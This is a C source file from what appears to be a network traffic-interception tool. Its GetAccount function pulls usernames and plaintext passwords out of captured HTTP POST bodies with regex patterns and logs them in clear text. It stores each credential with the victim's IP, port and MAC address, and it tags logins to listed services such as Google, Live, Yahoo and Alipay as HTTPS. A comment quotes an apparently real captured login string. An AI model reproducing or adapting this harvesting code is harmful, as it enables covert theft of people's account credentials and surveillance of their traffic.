
#include <pcre.h>
#include <string.h>
#include <stdio.h>

#include "accountL.h"
#include "storeEngineL.h"
#include "accountGeterL.h"
#include "Analyzer_log.h"

#ifndef PRO_ID_HTTPS
#define PRO_ID_HTTPS 701
#endif

#ifndef LZ_MAIL_LEN 
#define LZ_MAIL_LEN 100
#endif
#ifndef LZ_PASS_LEN
#define LZ_PASS_LEN 100
#endif
#ifndef LZ_URL_LEN
#define LZ_URL_LEN 1024
#endif

// #define LZ_ACCOUNT_HTTPS 701
#define LZ_ACCOUNT_HTTPS 203
#define LZ_ACCOUNT_HTTP 201

#define LZ_HTTPS_HOST_SIZE 15
const char *httpsHost[LZ_HTTPS_HOST_SIZE]={
"reg.163.com","login.live.com","accounts.google.com","ssl.mail.163.com","www.163.com","passport.alipay.com",
"edit.bjs.yahoo.com","login.yahoo.com","passport.sohu.com","mail.126.com","mail.yeah.net","mail.sina.com.cn","login.sina.com.cn","logins.daum.net","my.screenname.aol.com"
};

pcre* matchUser = NULL;
pcre* reserveMatchUser = NULL;
pcre* matchPass = NULL;

//Function name : GetAccount
//
//Description: get the login id and password form post data
//Parameter: ipCli :ip of client
//			ipSer: ip of server
//			portCli: port of client
//			portSer: port of Server
//			objId: object id
//			mac: mac of client
//			hostUrl: host domain
//			dat: data of the first frame of post
#ifdef VPDNLZ
int GetAccount(unsigned int ipCli,unsigned int ipSer,unsigned short portCli,unsigned short
		 		portSer,short objId,char* mac,const char* hostUrl,void* dat,unsigned int timeval,char *pppoe)
#else
int GetAccount(unsigned int ipCli,unsigned int ipSer,unsigned short portCli,unsigned short
		 		portSer,short objId,char* mac,const char* hostUrl,void* dat,unsigned int timeval)
#endif
{
	char* data = (char*)dat;
	char mail[LZ_MAIL_LEN] = {0};
	char pass[LZ_PASS_LEN] = {0};

	if(!matchUser){
		const char* chpError;
		int iErro;
		matchUser=pcre_compile(PATTERN_USER,PCRE_CASELESS,&chpError,&iErro,NULL);
	}
	if(!matchUser){
		LOG_ERROR("compile user pattern fail!\n");
		return -1;
	}
	if(!matchPass){
		const char* chpError;
		int iErro;
		matchPass=pcre_compile(PATTERN_PASSWD,PCRE_CASELESS,&chpError,&iErro,NULL);
	}
	if(!matchPass){
		LOG_ERROR("compile password pattern fail!\n");
		return -1;
	}
	int vector[12] = {0};
	char* start = data;
	if(!start){
		return -2;
	}
	int  iLen=strlen(start);
	int iResult=-1;
	iResult=pcre_exec(matchUser,NULL,start,iLen,0,0,vector,12);	
	
	if(iResult<0 || start[vector[1]] == '&'){
		if(!reserveMatchUser){
			const char* chpError;
			int iErro;
			reserveMatchUser = pcre_compile(PATTERN_USER_B,PCRE_CASELESS,&chpError,&iErro,NULL);
		}
		if(reserveMatchUser){
			iResult = pcre_exec(reserveMatchUser,NULL,start,iLen,0,0,vector,12);
		}
		if(iResult<0){
			//printf("find no username\n");
			return -1;
		}	
	}
	
	int i = vector[1];
	int j = 0;
	while(i<iLen && j<LZ_MAIL_LEN && start[i]!='&' && start[i]!=' ' && start[i]!='"')
	{
		mail[j]=start[i];
		i++;
		j++;	
	}
	//printf("user: %s\n",mail);
	int ineedSuffix=0;
	if(!strstr(mail,"%40")){
		if(!strstr(mail,"@"))
			ineedSuffix=1;
	}
	if(ineedSuffix){
		//char *suffix = NULL;
		char suffix[16] = {0};
		if(strstr(data,"&product=mail163"))
			strncpy(suffix, "@163.com", 8);
			//suffix="@163.com";
		else if(strstr(data,"&product=mail126"))
			strncpy(suffix, "@126.com", 8);
			//suffix="@126.com";
		if(suffix)
		{
			if(j+9 > LZ_MAIL_LEN)
				j=LZ_MAIL_LEN-9;
			memcpy(mail+j,suffix,8);
		}
	}	
	
	iResult = -1;
	iResult = pcre_exec(matchPass, NULL, start, iLen, 0, 0, vector, 12);
	LOG_INFO("pcre_exec MatchPass: %d\n", iResult);
	if(iResult>=0){
		int i=vector[1];
		int j=0;
		while(i<iLen &&j<LZ_PASS_LEN && start[i]!='&' && start[i]!=' ' && start[i]!='"')
		{
			pass[j]=start[i];
			i++;
			j++;	
		}

		/* 如果是互动百科的用户名标记&un=， 明文密码标记不是&pw=，而是&password2= */
		/* &un=bhstab2012%40163.com&pw=cba5b565ceadcb042f9ded6c7a22b02c&password2=bhstab2012p&seccode=& */
		const char *b = start + i;
		const char *e = NULL;
		if (*b == '&' && (b = strstr(b, "&password2=")) != NULL)
		{
			b = b + 11;
			if ((e = strstr(b, "&seccode=")) != NULL)
			{
				int j = 0;
				while (b < e && j < LZ_PASS_LEN)
				{
					pass[j++] = *b;
					++b;
				}
				pass[j] = 0;
			}
		}
	}
	else if(iResult<0){
		//printf("find no password\n");
		return 0;
	}
	if(iResult>=0){
		/*
		char* chpHost="Host:";
		char* chpAddr=strstr(data,chpHost);
		int i=0;
		int j=0;
		if(chpAddr){
			i=chpAddr-data;
			i+=5;
			while(data[i]==' ')
				i++;
			j=i;
			while(data[j]!=' ' && data[j]!='\r' && data[j]!='\n')
				j++;
		}
		*/
		int i = 0;
		int j = 0;
		j = strlen(hostUrl);
		LOG_INFO("mail:%s pass:%s\n", mail, pass);
		Account account;
		account.objectId = objId;
		account.type = LZ_ACCOUNT_HTTP;
		account.ipSrc = ipCli;
		account.ipDst = ipSer;
		account.portSrc = portCli;
		account.portDst = portSer;
		account.cap_time = timeval;
#ifdef VPDNLZ
		memcpy(account.pppoe, pppoe, strlen(pppoe));
#endif
		memcpy(account.macSrc, mac, 6);
		memset(account.mail, 0, LZ_MAIL_LEN);
		memset(account.pass, 0, LZ_PASS_LEN);
		memcpy(account.mail, mail, strlen(mail));
		memcpy(account.pass, pass, strlen(pass));
		memset(account.url, 0, LZ_URL_LEN);
		if(i < j)
		{
			if(j-i >=LZ_URL_LEN)
				j=LZ_URL_LEN+i-1;
			memcpy(account.url,hostUrl,j-i);
			int k=0;
			while(k<LZ_HTTPS_HOST_SIZE &&strcasecmp(account.url,httpsHost[k]))
				k++;
			if(k<LZ_HTTPS_HOST_SIZE)
				account.type=LZ_ACCOUNT_HTTPS;
		}
		storeAccount(&account);
		return 1;	
	}
	return 0;
///////////////////////////////////////////////////////////////	
	
	/*	
	char* patternA="login=";
	char* patternB="passwd=";
	char* addr=strstr(data,patternA);
	if(!addr){
		patternA="Email=";
		patternB="Passwd=";
		addr=strstr(data,patternA);	
	}
	if(!addr)
		return -1;
	int index=(int)addr-(int)data;
	index+=strlen(patternA);
	int len=strlen(data);
	int i=0;
	while(i<100&&index<len && data[index]!='&'){
		mail[i]=data[index];
		i++;
		index++;
	}
	addr=strstr(data,patternB);
	if(!addr)
		return -1;
	index=(int)addr-(int)data;
	index+=strlen(patternB);
	i=0;
	while(i<100&& index<len&&data[index]!='&'){
		pass[i]=data[index];
		i++;
		index++;
	}
	//printf("mail:%s pass:%s\n",mail,pass);
	Account account;
	account.objectId=objId;
	account.type=PRO_ID_HTTPS;
	account.ipSrc=ipCli;
	account.ipDst=ipSer;
	account.portSrc=portCli;
	account.portDst=portSer;
	memcpy(account.macSrc,mac,6);
	memcpy(account.mail,mail,100);
	memcpy(account.pass,pass,100);
	memset(account.url,0,LZ_URL_LEN);
	storeAccount(&account);
	return 1;
	*/
}

